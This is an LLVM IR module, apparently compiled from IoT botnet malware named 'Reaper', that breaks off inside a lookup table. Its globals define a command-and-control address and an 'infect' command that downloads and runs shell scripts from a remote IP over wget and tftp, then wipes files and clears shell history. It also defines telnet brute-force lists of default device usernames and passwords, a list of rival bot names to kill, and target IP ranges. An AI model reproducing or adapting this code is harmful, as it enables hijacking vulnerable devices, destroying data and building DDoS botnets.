; ModuleID = 'host/ir_bcf/Reaper.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@knownBots = global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.82, i32 0, i32 0)], align 16
@.str = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"hackmy*\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"b1\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.22 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.28 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.29 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"tel*\00", align 1
@.str.33 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.37 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"xxb*\00", align 1
@.str.39 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.49 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.52 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.53 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.55 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.57 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.58 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"gtop\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"ftp*\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"botnet\00", align 1
@.str.66 = private unnamed_addr constant [8 x i8] c"swatnet\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"ballpit\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"fucknet\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"cracknet\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"weednet\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"gaynet\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"queernet\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"ballnet\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"unet\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"yougay\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"sttftp\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"sstftp\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"sbtftp\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"btftp\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"y0u1sg3y\00", align 1
@.str.81 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.82 = private unnamed_addr constant [5 x i8] c"IoT*\00", align 1
@PromServer = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i32 0, i32 0)], align 8
@.str.83 = private unnamed_addr constant [16 x i8] c"46.101.35.30:23\00", align 1
@infect = global i8* getelementptr inbounds ([341 x i8], [341 x i8]* @.str.84, i32 0, i32 0), align 8
@.str.84 = private unnamed_addr constant [341 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.35.30/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 46.101.35.30 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 46.101.35.30; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.85 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.87 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.89 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"666666\00\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"supervisor\00\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.95 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@passwords = global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.97 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.98 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"tini\00\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"zyad1234\00\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"1234qwer\00\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"oelinux123\00\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.115, i32 0, i32 0), i8* null], align 16
@.str.106 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.107 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.110 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.112 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.115 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.119, i32 0, i32 0), i8* null], align 16
@.str.116 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.119 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* null], align 16
@.str.120 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.121 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.122 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.123 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.124 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@.str.127 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@Nranges = global [16 x i32] [i32 110, i32 111, i32 112, i32 113, i32 114, i32 115, i32 116, i32 117, i32 118, i32 119, i32 223, i32 1, i32 103, i32 203, i32 202, i32 122], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.558 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.130 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.131 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 